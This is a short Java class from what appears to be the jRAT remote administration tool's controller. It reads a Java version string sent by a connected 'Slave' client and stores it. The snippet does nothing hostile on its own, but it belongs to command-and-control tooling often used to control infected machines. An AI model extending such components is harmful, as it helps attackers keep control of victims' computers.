package jrat.controller.packets.incoming;

import jrat.controller.Slave;


public class Packet9InitJavaVersion implements IncomingPacket {

	@Override
	public void read(Slave slave) throws Exception {
		String version = slave.readLine();
		slave.setJavaVersion(version);
	}
}
